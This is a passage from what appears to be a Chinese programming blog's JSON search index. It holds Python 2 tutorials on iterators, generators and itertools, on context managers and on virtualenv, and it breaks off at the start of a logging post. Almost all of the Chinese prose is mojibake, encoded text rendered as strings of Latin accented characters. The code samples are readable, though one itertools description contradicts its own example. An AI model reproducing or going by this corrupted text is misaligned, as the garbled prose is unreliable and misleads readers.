ä¹‹è¿­ä»£å™¨","slug":"learning-python-iterator","date":"2015-10-26T07:43:00.000Z","updated":"2017-06-29T04:38:40.337Z","comments":true,"path":"2015/10/learning-python-iterator/","link":"","permalink":"https://blog.stdioa.com/2015/10/learning-python-iterator/","excerpt":"æ˜¨æ™šç”¨pythonå†™äº†ä¸ªç®€å•çš„é“¾è¡¨ï¼Œçªç„¶æƒ³èµ·äº†è¿­ä»£å™¨ï¼Œå°±éšæ‰‹æ•´ç†ä¸€ä¸‹ï¼Œé¡ºä¾¿è¿‡ä¸€ä¸‹itertoolsæ¨¡å—ã€‚","text":"æ˜¨æ™šç”¨pythonå†™äº†ä¸ªç®€å•çš„é“¾è¡¨ï¼Œçªç„¶æƒ³èµ·äº†è¿­ä»£å™¨ï¼Œå°±éšæ‰‹æ•´ç†ä¸€ä¸‹ï¼Œé¡ºä¾¿è¿‡ä¸€ä¸‹itertoolsæ¨¡å—ã€‚ 1. ç®€ä»‹è¿­ä»£å™¨(iterator)æ˜¯Pythonä¸­ä¸€ç§ç”¨æ¥è¿›è¡Œæƒ°æ€§è¿­ä»£çš„æ•°æ®ç±»å‹ï¼Œè¿­ä»£å™¨å¯ä»¥æƒ°æ€§åœ°åœ¨éœ€è¦æ—¶ç”Ÿæˆæ•°æ®å¹¶è¿”å›å·²è¿›è¡Œè¿­ä»£ï¼Œè€Œä¸éœ€è¦åœ¨å¼€å§‹è¿›è¡Œæ—¶ç”Ÿæˆæ‰€æœ‰æ•°æ®ï¼ˆæœ‰çš„æ—¶å€™ä¹Ÿä¸å¯èƒ½ç”Ÿæˆæ‰€æœ‰æ•°æ®ï¼Œæ¯”å¦‚æ–æ³¢é‚£å¥‘æ•°åˆ—çš„æ— ç©·è¿­ä»£ç­‰ï¼‰ç„¶åä¸€ä¸ªä¸€ä¸ªè¿”å›ã€‚ 2. ç”¨æ³• 2.1 æœ€åŸºç¡€çš„ä¾‹å­: iter()å‡½æ•°ç”Ÿæˆè¿­ä»£å™¨1234567891011list_ = [1,2]it = iter(list_) # è¿”å›ä¸€ä¸ªè¿­ä»£å™¨it.next() # è·å–ä¸€ä¸ªè¿­ä»£å™¨å…ƒç´ ï¼Œè¿”å›1next(it) # ä½¿ç”¨nextå†…å»ºå‡½æ•°ï¼Œç­‰åŒäºit.next(), è¿”å›2it.next() # è¿­ä»£ç»“æŸï¼Œè§¦å‘StopIterationå¼‚å¸¸list_ = [1,2]it = iter(list_)for x in it: # ç”¨forå¾ªç¯å¯¹è¿­ä»£å™¨è¿›è¡Œå¾ªç¯è¿­ä»£ print x # è¿­ä»£ç»“æŸæ—¶ï¼ŒStopIterationä¸ä¼šè¢«è§¦å‘å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿­ä»£å™¨åªå¯å‘å‰è¿­ä»£ï¼Œä¸èƒ½å‘åè¿­ä»£ï¼Œè·å–ä¹‹å‰å·²è¿”å›è¿‡çš„å€¼ï¼ˆå½“ç„¶ç»å¤§å¤šæ•°çš„æ—¶å€™ä¹Ÿæ²¡å¿…è¦å‘åè¿­ä»£ï¼‰ã€‚ 2.2 ç”Ÿæˆå™¨[x*2 for x in range(10) if x%2==0], è¿™æ®µä»£ç ä¸ºåˆ—è¡¨ç”Ÿæˆå¼ï¼ˆä¹Ÿç§°ä½œåˆ—è¡¨è§£æï¼‰ï¼Œå¯ä»¥å°†ä¸€ä¸ªåˆ—è¡¨è¿›è¡Œè½¬åŒ–ï¼›å°†æ–¹æ‹¬å·å˜ä¸ºåœ†æ‹¬å·ï¼Œ(x*2 for x in range(10) if x%2==0), åˆ™è¯¥ä»£ç å˜ä¸ºä¸€ä¸ªç”Ÿæˆå™¨(generator)ã€‚ç”Ÿæˆå™¨å¯ä»¥åƒè¿­ä»£å™¨ä¸€æ ·è¿›è¡Œè¿­ä»£ï¼Œè¿˜å¯ä»¥é€šè¿‡ç”Ÿæˆå™¨çš„æˆå‘˜å‡½æ•°å’Œç”Ÿæˆå™¨å†…éƒ¨çš„ä»£ç è¿›è¡Œæ•°æ®äº¤æ¢ã€‚ 3. è‡ªå®šä¹‰è¿­ä»£å™¨åŠç”Ÿæˆå™¨ 3.1 è‡ªå®šä¹‰è¿­ä»£å™¨åœ¨ç¼–å†™ç±»çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡å®šä¹‰ç±»çš„__iter__å‡½æ•°æ¥ä½¿ç±»å¯ä»¥è½¬åŒ–ä¸ºè¿­ä»£å™¨ã€‚åœ¨__iter__å‡½æ•°ç»“æŸæ—¶ï¼Œä¼šè‡ªåŠ¨å¼•å‘StopIterationå¼‚å¸¸ã€‚ä¾‹:12345678910111213141516class Counter(object): def __init__(self): self.number = 0 def __iter__(self): while True: yield self.number self.number += 1a = Counter()it = iter(a)print it.next() # 0print it.next() # 1for num in it: print num # å› ä¸ºè¯¥è¿­ä»£å™¨ä¸ºæ— ç©·è¿­ä»£ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´æ­»å¾ªç¯ 3.2 è‡ªå®šä¹‰ç”Ÿæˆå™¨å¯ä»¥ç”¨å‡½æ•°è‡ªå®šä¹‰ç”Ÿæˆå™¨ã€‚ä¾‹ï¼š1234567891011def fib(): a, b = 1, 1 while True: yield a # ç”¨yieldå‡½æ•°æ¥åœ¨è¿­ä»£æ—¶è¿”å›å€¼ï¼Œåœ¨ä¸‹æ¬¡è¿­ä»£æ—¶ï¼Œè‡ªåŠ¨ä»yieldè¯­å¥çš„ä¸‹ä¸€æ¡è¯­å¥å¼€å§‹æ‰§è¡Œ a, b = b, a+bk = fib()for i in range(10): print next(k) # 1 1 2 3 5 8 13 21 34 55print type(k) # &lt;generator object fib at 0x0268BDF0&gt; 3.3 ç”Ÿæˆå™¨çš„è¿›é˜¶ç”¨æ³•generator.next()ç”¨æ¥è¿›è¡Œè¿­ä»£å¹¶è·å–è¿”å›å€¼ï¼›generator.close()ç”¨æ¥å…³é—­ç”Ÿæˆå™¨ï¼Œå¹¶åœ¨ä¸‹æ¬¡è¿­ä»£æ—¶å‡ºå‘StopIterationå¼‚å¸¸ã€‚1234a = fib()print next(a) # 1a.close() # å…³é—­è¿­ä»£å™¨print next(a) # StopIterationgenerator.send(arg)å¯ä»¥å‘ç”Ÿæˆå™¨å†…éƒ¨ä¼ é€’å¯¹è±¡ï¼Œgenerator.throw(typ[,val[,tb]])å¯ä»¥å‘ç”Ÿæˆå™¨å†…éƒ¨ä¼ é€’å¼‚å¸¸ï¼ˆåŒ…æ‹¬ç±»å‹ï¼Œå…·ä½“å¼‚å¸¸å¯¹è±¡å’ŒTracebackï¼‰ï¼›åœ¨è°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°åï¼Œç”Ÿæˆå™¨ç«‹åˆ»è¿›è¡Œè¿­ä»£å¹¶è¿”å›å€¼ï¼ˆæˆ–è§¦å‘StopIterationï¼‰ã€‚å…·ä½“æ“ä½œï¼š123456789101112131415161718def counter(): num = 0 while True: try: ret = yield num except ValueError: print \"ValueError caught\" if ret is not None: num = ret num += 1c = counter()print c.next() # 0print c.send(3) # ä¼ è¾“3ï¼Œå†…éƒ¨yieldè¯­å¥è¿”å›3ï¼Œç„¶åè¿›è¡Œä¸‹æ¬¡è¿­ä»£ï¼Œç”Ÿæˆ4print c.next() # 5c.throw(ValueError) # ä¼ é€’å¼‚å¸¸ï¼Œå†…éƒ¨yieldå‡½æ•°è§¦å‘å¼‚å¸¸ï¼Œç„¶åè¿›è¡Œå¼‚å¸¸å¤„ç†ï¼Œè¾“å‡º\"ValueError caught\"ï¼Œè‹¥æœªå¤„ç†ï¼Œåˆ™å¼‚å¸¸ä¼šå‘ä¸Šå±‚æŠ›å‡ºprint c.next() # 6 4. itertoolsæ¨¡å—itertoolsæ˜¯Pythonè‡ªå¸¦çš„ä¸€ä¸ªæ¨¡å—ï¼ŒåŒ…å«å¾ˆå¤šä½¿ç”¨å‡½æ•°ï¼Œç”¨æ¥å¯¹ä¸€ä¸ªæˆ–å¤šä¸ªå¯è¿­ä»£å¯¹è±¡è¿›è¡Œæ“ä½œåè¿”å›ä¸€ä¸ªè¿­ä»£å™¨ã€‚å…·ä½“å‡½æ•°åˆ—è¡¨ï¼šæ— é™è¿­ä»£å™¨count(start, [step])ä»startå¼€å§‹ï¼Œä»¥åæ¯ä¸ªå…ƒç´ éƒ½åŠ ä¸Šstepã€‚stepé»˜è®¤å€¼ä¸º1ã€‚count(5) -&gt; 5 6 7 â€¦cycle(p)è¿­ä»£è‡³pçš„æœ€åä¸€ä¸ªå…ƒç´ ä¹‹åï¼Œä»pçš„ç¬¬ä¸€ä¸ªå…ƒç´ é‡æ–°è¿­ä»£ã€‚cycle('abc') -&gt; a b c a b c â€¦repeat(elem [,n])æ— é™é‡å¤æˆ–é‡å¤næ¬¡è¿”å›elemã€‚repeat(&quot;Ah&quot;, 3) -&gt; â€œAhâ€ â€œAhâ€ â€œAhâ€åœ¨æœ€çŸ­çš„åºåˆ—ç»“æŸè¿­ä»£æ—¶åœæ­¢è¿­ä»£chain(p, q, â€¦)è¿­ä»£è‡³åºåˆ—pçš„æœ€åä¸€ä¸ªå…ƒç´ åï¼Œä»qçš„ç¬¬ä¸€ä¸ªå…ƒç´ å¼€å§‹ï¼Œç›´åˆ°æ‰€æœ‰åºåˆ—ç»ˆæ­¢ã€‚chain(&quot;ABC&quot;, &quot;DEF&quot;) -&gt; A B C D E Fcompress(data, selectors)å¦‚æœbool(selectors[n])ä¸ºTrueï¼Œåˆ™next()è¿”å›data[n]ï¼Œå¦åˆ™è·³è¿‡data[n]ã€‚compress('ABCDEF', [1,0,1,0,1,1]) -&gt; A C E Fdropwhile(pred, seq)å½“predå¯¹seq[n]çš„è°ƒç”¨è¿”å›Falseæ—¶æ‰å¼€å§‹è¿­ä»£ã€‚dropwhile(lambda x: x&lt;5, [1,4,6,4,1]) -&gt; 6 4 1takewhile(pred, seq)dropwhileçš„ç›¸åç‰ˆæœ¬ã€‚takewhile(lambda x: x&lt;5, [1,4,6,4,1]) -&gt; 1 4ifilter(pred, seq)å†…å»ºå‡½æ•°filterçš„è¿­ä»£å™¨ç‰ˆæœ¬ã€‚ifilter(lambda x: x%2, range(10)) -&gt; 1 3 5 7 9ifilterfalse(pred, seq)ifilterçš„ç›¸åç‰ˆæœ¬ã€‚ifilterfalse(lambda x: x%2, range(10)) -&gt; 0 2 4 6 8imap(func, p, q, ...)å†…å»ºå‡½æ•°mapçš„è¿­ä»£å™¨ç‰ˆæœ¬ã€‚imap(pow, (2,3,10), (5,2,3)) -&gt; 32 9 1000starmap(func, seq)å°†seqçš„æ¯ä¸ªå…ƒç´ ä»¥å˜é•¿å‚æ•°(*args)çš„å½¢å¼è°ƒç”¨funcã€‚starmap(pow, [(2,5), (3,2), (10,3)]) -&gt; 32 9 1000izip(p, q, ...)å†…å»ºå‡½æ•°zipçš„è¿­ä»£å™¨ç‰ˆæœ¬ã€‚izip('ABCD', 'xy') -&gt; Ax Byizip_longest(p, q, ..., fillvalue=None)izipçš„å–æœ€é•¿åºåˆ—çš„ç‰ˆæœ¬ï¼ŒçŸ­åºåˆ—å°†å¡«å…¥fillvalueã€‚izip_longest('ABCD', 'xy', fillvalue='-') -&gt; Ax By C- D-tee(it, n)è¿”å›nä¸ªè¿­ä»£å™¨itçš„å¤åˆ¶è¿­ä»£å™¨ã€‚groupby(iterable[, keyfunc])è¿™ä¸ªå‡½æ•°åŠŸèƒ½ç±»ä¼¼äºSQLçš„åˆ†ç»„ã€‚ä½¿ç”¨groupbyå‰ï¼Œé¦–å…ˆéœ€è¦ä½¿ç”¨ç›¸åŒçš„keyfuncå¯¹iterableè¿›è¡Œæ’åºï¼Œæ¯”å¦‚è°ƒç”¨å†…å»ºçš„sortedå‡½æ•°ã€‚ç„¶åï¼Œgroupbyè¿”å›è¿­ä»£å™¨ï¼Œæ¯æ¬¡è¿­ä»£çš„å…ƒç´ æ˜¯å…ƒç»„(keyå€¼, iterableä¸­å…·æœ‰ç›¸åŒkeyå€¼çš„å…ƒç´ çš„é›†åˆçš„å­è¿­ä»£å™¨)ã€‚æˆ–è®¸çœ‹çœ‹Pythonçš„æ’åºæŒ‡å—å¯¹ç†è§£è¿™ä¸ªå‡½æ•°æœ‰å¸®åŠ©ã€‚groupby([0, 0, 0, 1, 1, 1, 2, 2, 2]) -&gt; (0, (0 0 0)) (1, (1 1 1)) (2, (2 2 2))ç»„åˆè¿­ä»£å™¨product(p, q, ... [repeat=1])ç”Ÿæˆç¬›å¡å°”ç§¯ã€‚product('ABCD', repeat=2) --&gt; AA AB AC AD BA BB BC BD CA CB CC CD DA DB DC DDpermutations(p[, r])ç”Ÿæˆå…¨æ’åˆ—ã€‚permutations('ABCD', 2) --&gt; AB AC AD BA BC BD CA CB CD DA DB DCcombinations(p, r)ç”Ÿæˆç»„åˆã€‚combinations('ABCD', 2) --&gt; AB AC AD BC BD CDcombinations_with_replacement()ç”Ÿæˆæ’åˆ—å…ƒç´ (p, q), ä¸”p&lt;q.combinations_with_replacement('ABCD', 2) --&gt; AA AB AC AD BB BC BD CC CD DDéƒ¨åˆ†æ–‡å­—æ¥æºï¼šhttp://www.cnblogs.com/huxi/archive/2011/07/01/2095931.html 5. å‚è€ƒæ–‡æ¡£itertools - Python Docç”Ÿæˆå™¨ - å»–é›ªå³°çš„Pythonæ•™ç¨‹Python è¿­ä»£å™¨ &amp; __iter__æ–¹æ³•Pythonå‡½æ•°å¼ç¼–ç¨‹æŒ‡å—ï¼ˆä¸‰ï¼‰ï¼šè¿­ä»£å™¨","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"è¿­ä»£å™¨","slug":"è¿­ä»£å™¨","permalink":"https://blog.stdioa.com/tags/è¿­ä»£å™¨/"}]},{"title":"Pythonå­¦ä¹ ä¹‹ä¸Šä¸‹æ–‡ç®¡ç†","slug":"learning-python-context-management","date":"2015-10-22T12:00:00.000Z","updated":"2017-06-29T04:38:40.600Z","comments":true,"path":"2015/10/learning-python-context-management/","link":"","permalink":"https://blog.stdioa.com/2015/10/learning-python-context-management/","excerpt":"æœ€è¿‘çªå‘å¥‡æƒ³ï¼Œæƒ³å†™ä¸€ä¸ªèƒ½æ”¹å˜å½“å‰è¾“å‡ºç¯å¢ƒï¼Œè¾“å‡ºå½©è‰²æ–‡å­—çš„ä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼Œäºæ˜¯å­¦ä¹ äº†ä¸€ä¸‹ä¸Šä¸‹æ–‡ç®¡ç†ã€‚","text":"æœ€è¿‘çªå‘å¥‡æƒ³ï¼Œæƒ³å†™ä¸€ä¸ªèƒ½æ”¹å˜å½“å‰è¾“å‡ºç¯å¢ƒï¼Œè¾“å‡ºå½©è‰²æ–‡å­—çš„ä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼Œäºæ˜¯å­¦ä¹ äº†ä¸€ä¸‹ä¸Šä¸‹æ–‡ç®¡ç†ã€‚ 1. ç®€ä»‹ä¸Šä¸‹æ–‡ç®¡ç†å™¨(context manager)æ˜¯Python2.5å¼€å§‹æ”¯æŒçš„ä¸€ç§è¯­æ³•ï¼Œç”¨äºè§„å®šæŸä¸ªå¯¹è±¡çš„ä½¿ç”¨èŒƒå›´ã€‚ä¸€æ—¦è¿›å…¥æˆ–è€…ç¦»å¼€è¯¥ä½¿ç”¨èŒƒå›´ï¼Œä¼šæœ‰ç‰¹æ®Šæ“ä½œè¢«è°ƒç”¨ (æ¯”å¦‚ä¸ºå¯¹è±¡åˆ†é…æˆ–è€…é‡Šæ”¾å†…å­˜)ã€‚ä¸€ä¸ªæœ€ç®€å•çš„ä¾‹å­:12345with file(\"a.txt\", \"r\") as f: s = f.read() print f.closed # æ­¤æ—¶æ–‡ä»¶æ˜¯æ‰“å¼€çš„print f.closed # å˜é‡så’Œfä¾ç„¶å­˜åœ¨ï¼Œä½†æ­¤æ—¶få·²å…³é—­ 2. ç¼–å†™ä¸Šä¸‹æ–‡ç®¡ç†å™¨ä¸ºä¸€ä¸ªç±»ç¼–å†™ä¸Šä¸‹æ–‡ç®¡ç†å™¨æ—¶ï¼Œéœ€è¦å®šä¹‰ç±»çš„__enter__å’Œ__exit__å‡½æ•°ã€‚ 2.1 __enter__å‡½æ•°__enter__å‡½æ•°è§„å®šå¦‚ä¸‹ï¼šcontextmanager.__enter__()Enter the runtime context and return either this object or another object related to the runtime context. The value returned by this method is bound to the identifier in the as clause of with statements using this context manager.è¿›å…¥å½“å‰ä¸Šä¸‹æ–‡ï¼Œå¹¶è¿”å›å½“å‰å¯¹è±¡æˆ–å¦ä¸€ä¸ªä¸å½“å‰ä¸Šä¸‹æ–‡ç›¸å…³çš„å¯¹è±¡ã€‚è¢«è¯¥å‡½æ•°è¿”å›çš„å˜é‡ä¼šé€šè¿‡è¯¥ä¸Šä¸‹æ–‡ç®¡ç†å™¨ä¸withæ–‡æ³•ä¸­asåçš„å£°æ˜æ‰€ç»‘å®šã€‚ä¾‹ï¼š12345678910class BracketAdder(object): def __enter__(self): # do something with self and runtime context sys.stdout.write(\"(\") # è¾“å‡ºå·¦æ‹¬å· return self # __exit__å‡½æ•°ç•¥with BracketAdder() as ba: # do_something 2.2 __exit__å‡½æ•°__exit__å‡½æ•°æ ¼å¼å¦‚ä¸‹:contexmanager.__exit__(exc_type, exc_val, exc_tb)æ–‡æ¡£å¤ªé•¿æ‡’å¾—ç¿»è¯‘äº†_(:Ğ·ã‚âˆ )_å¦‚æœä»£ç å—ä¸­å‡ºç°å¼‚å¸¸ï¼Œexc_typeä¸ºå¼‚å¸¸ç±»å‹ï¼Œexc_valä¸ºè¯¥å¼‚å¸¸ï¼Œexc_tbä¸ºtraceback.__exit__å‡½æ•°åº”è¿”å›ä¸€ä¸ªboolç±»å‹ï¼Œè‹¥è¿”å›å€¼ä¸ºTrue, åˆ™åœ¨ä»£ç å—åŠ__exit__å‡½æ•°è¿è¡Œç»“æŸåä¸ä¼šæŠ›å‡ºä»»ä½•å¼‚å¸¸ï¼Œç„¶åç«‹å³æ‰§è¡Œåé¢çš„ä»£ç ï¼›è‹¥è¿”å›å€¼ä¸ºFalseï¼Œåˆ™åœ¨__exit__å‡½æ•°è¿è¡Œç»“æŸåæŠ›å‡ºå¼‚å¸¸ã€‚è‹¥ä»£ç å—ä¸­æœªå‡ºç°å¼‚å¸¸ï¼Œåˆ™ä¸‰ä¸ªå˜é‡å‡ä¸ºNone.ä¾‹ï¼š12345678910111213class BracketAdder(object): # __enter__å‡½æ•°ç•¥ def __exit__(self, exc_type, exc_val, exc_tb): # do something with self and runtime context sys.stdout.write(')') if exc_type == NameError: return True else: return Falsewith BracketAdder(): print a # è‹¥æ‰§è¡Œè¿™ä¸€æ¡å¼•å‘NameErrorå¼‚å¸¸ï¼Œåˆ™å¼‚å¸¸ä¸ä¼šè¢«æŠ›å‡º a = 1/0 # è‹¥æ‰§è¡Œè¿™ä¸€æ¡å¼•å‘ZeroDivisionError, åˆ™å¼‚å¸¸ä¼šè¢«æŠ›å‡º 3. ç»¼åˆç¤ºä¾‹1234567891011121314151617181920212223242526272829303132333435# coding: utf-8import sysclass CManager(object): def __init__(self): self.in_context = False def __enter__(self): self.in_context = True print \"I'm entering the context\" return self def __exit__(self, exc_type, exc_val, exc_tb): self.in_context = False print \"I'm leaving the context\" if exc_type == NameError: # æ‹¦æˆªNameErrorå¼‚å¸¸ return True else: return False def show(self): print \"I'm &#123;status&#125;in the context.\".format( status=\"\" if self.in_context else \"not \")with CManager() as ba: ba.show() # blahblah raise NameError # è§¦å‘NameErrorå¼‚å¸¸ï¼Œä»£ç å—åé¢çš„è¯­å¥å®é™…ä¸ä¼šæ‰§è¡Œï¼Œè€Œè¯¥å¼‚å¸¸ä¼šåœ¨__exit__å‡½æ•°ä¸­è¢«æ‹¦æˆª print 'k'ba.show()ç¨‹åºè¾“å‡º:1234I&apos;m entering the contextI&apos;m in the context.I&apos;m leaving the contextI&apos;m not in the context. 4. å‚è€ƒæ–‡æ¡£Context Manager Types - Python DocPythonæ·±å…¥02 ä¸Šä¸‹æ–‡ç®¡ç†å™¨æµ…è°ˆ Python çš„ with è¯­å¥ 5. åè®°è¿™äº›å°çŸ¥è¯†ç‚¹å¹³æ—¶åªæ˜¯ç²—ç•¥çš„çœ‹ä¸€ä¸‹ï¼Œåªèƒ½è¾¾åˆ°ä¼šç”¨çš„ç¨‹åº¦ï¼Œæœ‰æ—¶å€™è§‰å¾—åªæœ‰è‡ªå·±æ•´ç†ä¸€éæ‰èƒ½çœŸæ­£ç†è§£å®ƒä»¬ï¼Œæ‰èƒ½ç†Ÿç»ƒè¿ç”¨ã€‚æ‰€ä»¥â€¦åˆå¡«å®Œä¸€ä¸ªå‘ã€‚å‘¨æœ«ç®€å•å†™å†™PyQt4å§â€¦","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"ä¸Šä¸‹æ–‡ç®¡ç†","slug":"ä¸Šä¸‹æ–‡ç®¡ç†","permalink":"https://blog.stdioa.com/tags/ä¸Šä¸‹æ–‡ç®¡ç†/"}]},{"title":"Pythonå­¦ä¹ ä¹‹virtualenv","slug":"learning-python-virtualenv","date":"2015-10-22T02:15:00.000Z","updated":"2017-06-29T04:38:40.434Z","comments":true,"path":"2015/10/learning-python-virtualenv/","link":"","permalink":"https://blog.stdioa.com/2015/10/learning-python-virtualenv/","excerpt":"ç”¨è¿‡virtualenvçš„äººéƒ½è¯´å¥½ï¼Œå¯æ˜¯æˆ‘æ²¡æœ‰å…·ä½“ä½¿ç”¨è¿‡ï¼Œæ‰€ä»¥å°è¯•äº†ä¸€ä¸‹ï¼Œç”¨å®Œæˆ‘ä¹Ÿè¯´å¥½~233333","text":"ç”¨è¿‡virtualenvçš„äººéƒ½è¯´å¥½ï¼Œå¯æ˜¯æˆ‘æ²¡æœ‰å…·ä½“ä½¿ç”¨è¿‡ï¼Œæ‰€ä»¥å°è¯•äº†ä¸€ä¸‹ï¼Œç”¨å®Œæˆ‘ä¹Ÿè¯´å¥½~233333 1. ç®€ä»‹virtualenvæ˜¯ä¸€ä¸ªpythonåº“ï¼Œç”¨äºåˆ›å»ºç‹¬ç«‹pythonå¼€å‘åŠè¿è¡Œç¯å¢ƒã€‚ä¸€èˆ¬linuxç¯å¢ƒä¸‹å¦‚æœåœ¨å…¨å±€ç”¨pipå®‰è£…æ¨¡å—æ—¶éœ€è¦ä½¿ç”¨sudoå‘½ä»¤ï¼Œå¯æ˜¯åœ¨å…±äº«ä¸»æœºä¸Šå°†rootæƒé™äº¤ç»™ä¸€èˆ¬ç”¨æˆ·æ˜¯ä¸æ˜¾ç¤ºè€Œä¸”ä¸å®‰å…¨çš„ã€‚å¯æ˜¯æœ‰äº†virtualenv, æ™®é€šç”¨æˆ·å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒï¼Œç„¶ååœ¨è™šæ‹Ÿç¯å¢ƒä¸­ä»¥æ™®é€šç”¨æˆ·æƒé™å®‰è£…æ¨¡å—ï¼Œæ›´æ”¹ç¯å¢ƒå˜é‡ï¼Œè¿›è¡Œå¼€å‘å’Œè¿è¡Œpythonç¨‹åºè€Œä¸ä¼šå½±å“ç³»ç»Ÿç¯å¢ƒçš„ç¯å¢ƒå˜é‡å’ŒPythonæ¨¡å—ã€‚ 2. åˆ›å»ºvirtualenvç¯å¢ƒè¾“å…¥virtualenv venvåˆ›å»ºåä¸ºvenvçš„è™šæ‹Ÿç¯å¢ƒã€‚åˆ›å»ºè™šæ‹Ÿç¯å¢ƒçš„å¸¸ç”¨é€‰é¡¹ï¼šâ€“no-site-packages ä¸ä½¿ç”¨ç³»ç»Ÿä¸­çš„site packagesâ€“system-site-package ä½¿ç”¨ç³»ç»Ÿä¸­çš„site packages (æ®è¯´æ˜¯é»˜è®¤ï¼Œä½†åœ¨æˆ‘è¿™é»˜è®¤æ˜¯ä¸ä½¿ç”¨çš„)-p PYTHON_EXE, --python=PYTHON_EXE ä½¿ç”¨æŒ‡å®šçš„pythonè§£é‡Šå™¨ï¼Œè¿™é‡Œçš„PYTHON_EXEåœ¨Windowsä¸‹éœ€è¦ç”¨ç»å¯¹è·¯å¾„ï¼Œæ¯”å¦‚C:\\Python27\\python.exe\\å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒå’Œç³»ç»Ÿé…ç½®æ–‡ä»¶æ¥è®¾ç½®virtualenvé»˜è®¤åˆ›å»ºé€‰é¡¹ï¼Œè¯¦æƒ…è§è¿™é‡Œã€‚è¾“å‡ºï¼š123G:\\&gt;virtualenv venvNew python executable in venv\\Scripts\\python.exeInstalling setuptools, pip, wheel...done. 3. è¿›å…¥åŠé€€å‡ºè™šæ‹Ÿç¯å¢ƒè¿›å…¥venvç›®å½•ï¼ŒLinuxä¸‹è¾“å…¥bin/activate, Windowsä¸‹è¾“å…¥Scripts\\activateè¿›å…¥è™šæ‹Ÿç¯å¢ƒã€‚12G:\\venv&gt;Scripts\\activate(venv) G:\\venv&gt;è¿›å…¥ç¯å¢ƒåï¼Œè¾“å…¥deactivateé€€å‡ºã€‚12(venv) G:\\venv&gt;deactivateG:\\venv&gt; 4. ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ 4.1 å®‰è£…ç¬¬ä¸‰æ–¹æ¨¡å—å®‰è£…è¿‡ç¨‹ä¸å¹³æ—¶ç›¸ç¬¦ï¼ˆæ¯”å¦‚ä½¿ç”¨pip install), åªä¸è¿‡å®‰è£…åçš„åŒ…ä¼šå­˜å‚¨åœ¨è™šæ‹Ÿç¯å¢ƒä¸­ã€‚ 4.2 è®¾ç½®ç¯å¢ƒå˜é‡Linuxä¸‹è¾“å…¥export VAR1=&quot;value1&quot;, Windowsä¸‹è¾“å…¥set VAR1=value1æ¥è®¾ç½®è™šæ‹Ÿç¯å¢ƒçš„ç¯å¢ƒå˜é‡1234(venv) C:\\Users\\Stdio\\Desktop\\temp\\venv&gt;set VAR1=value1(venv) C:\\Users\\Stdio\\Desktop\\temp\\venv&gt;echo %VAR1%value1ç¯å¢ƒå˜é‡è®¾ç½®æˆåŠŸåï¼Œå³å¯åœ¨Pythonç¨‹åºä¸­åˆ©ç”¨è™šæ‹Ÿç¯å¢ƒçš„ç¯å¢ƒå˜é‡è¿›è¡Œç¨‹åºé…ç½®ï¼ˆæ¯”å¦‚flaskä¸­çš„app.config.from_envvar(&quot;FLASK_SETTINGS&quot;)ï¼‰ã€‚è¯¥ç¯å¢ƒå˜é‡åªåœ¨è™šæ‹Ÿç¯å¢ƒä¸­æœ‰æ•ˆï¼Œé€€å‡ºè™šæ‹Ÿç¯å¢ƒåç¯å¢ƒå˜é‡å³æ¶ˆå¤±ã€‚ 5. å‚è€ƒæ–‡æ¡£Virtualenv - virtualenv 13.1.2 documentationVirtualenv - virtualenv 1.7.1.2.post1 documentation ä¸­æ–‡ç‰ˆvirtualenvå…¥é—¨æ•™ç¨‹virtualenv â€“ pythonè™šæ‹Ÿæ²™ç›’ç”¨virtualenvå»ºç«‹å¤šä¸ªPythonç‹¬ç«‹å¼€å‘ç¯å¢ƒ 6. åè®°åˆå¡«å®Œä¸€ä¸ªå‘ï¼Œæœ¬æ¥æ‰“ç®—æ˜¨å¤©å°±å†™å¥½çš„ï¼Œç»“æœæ˜¨å¤©æ²¡å†™å®Œâ€¦","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"virtualenv","slug":"virtualenv","permalink":"https://blog.stdioa.com/tags/virtualenv/"}]},{"title":"Pythonå­¦ä¹ ä¹‹logging","slug":"learning-python-logging","date":"2015-10-21T08:00:00.000Z","updated":"2017-06-29T04:38:40.368Z","comments":true,"path":"2015/10/learning-python-logging/","link":"","permalink":"https://blog.stdioa.com/2015/10/learning-python-logging/","excerpt":"ä»¥å‰å†™ä»£ç çš„æ—¶å€™ï¼Œæ‰€æœ‰ä¿¡æ¯åŒ…æ‹¬è°ƒè¯•ä¿¡æ¯å…¨éƒ¨è¾“å‡ºåœ¨å±å¹•ä¸Šï¼Œæœ‰çš„æ—¶å€™ä¼šçœ‹èµ·æ¥ä¹±ç³Ÿç³Ÿçš„ï¼Œè¿™æ—¶å°±éœ€è¦loggingæ¨¡å—æ¥è®°å½•ä¿¡æ¯æˆ–ç”Ÿæˆæ—¥å¿—æ–‡ä»¶ã€‚","text":"ä»¥å‰å†™ä»£ç çš„æ—¶å€™ï¼Œæ‰€æœ‰ä¿¡æ¯åŒ…æ‹¬è°ƒè¯•ä¿¡æ¯å…¨éƒ¨è¾“å‡ºåœ¨å±å¹•ä¸Šï¼Œæœ‰çš„æ—¶å€™ä¼šçœ‹èµ·æ¥ä¹±ç³Ÿç³Ÿçš„ï¼Œè¿™æ—¶å°±éœ€è¦loggingæ¨¡å—æ¥è®°å½•ä¿¡æ¯æˆ–ç”Ÿæˆæ—¥å¿—æ–‡ä»¶ã€‚ 1. ç®€ä»‹loggingæ˜¯ä¸€ä¸ªç”¨æ¥è®°å½•æ—¥å¿—ä¿¡æ¯çš„æ¨¡å—ï¼Œå®ƒå¯ä»¥è¾“å‡ºä¿¡æ¯åˆ°stdoutæˆ–è€…è‡ªå®šçš„æ—¥å¿—æ–‡ä»¶ä¸­ã€‚ 2. åŸºæœ¬è¾“å‡ºä¿¡æ¯ï¼š12345logging.debug(\"A 